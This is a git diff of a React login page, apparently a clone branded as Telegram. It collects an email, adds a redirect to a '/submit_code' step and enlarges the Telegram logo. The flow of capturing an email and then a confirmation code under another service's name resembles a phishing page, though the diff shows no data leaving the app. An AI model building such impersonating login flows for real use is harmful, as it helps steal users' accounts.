@@ -1,9 +1,11 @@
 import React from 'react';
 import Logo from '../assets/images/telegram.png';
 import { useSendEmail } from '../hooks/useSendEmail';
+import { useNavigate } from 'react-router-dom';
 
 export default function Login() {
   const { sendEmail, data, loading, error } = useSendEmail();
+  const navigate = useNavigate()
 
   const handleSendEmail = (e) => {
     e.preventDefault();
@@ -11,10 +13,14 @@ export default function Login() {
     sendEmail(email); // correct and safe usage
   };
 
+  if (data?.status === 200) {
+    navigate('/submit_code')
+  }
+
   return (
     <section className="min-h-screen bg-neutral-900 flex items-center justify-center px-4">
       <div className="w-full max-w-sm text-white space-y-6 text-center">
-        <img src={Logo} alt="Telegram" className="w-28 h-28 mx-auto" />
+        <img src={Logo} alt="Telegram" className="w-40 h-40 mx-auto" />
         <h1 className="text-4xl font-semibold">Telegram</h1>
         <p className="text-gray-400">Please confirm your country code
           and enter your Email.</p>
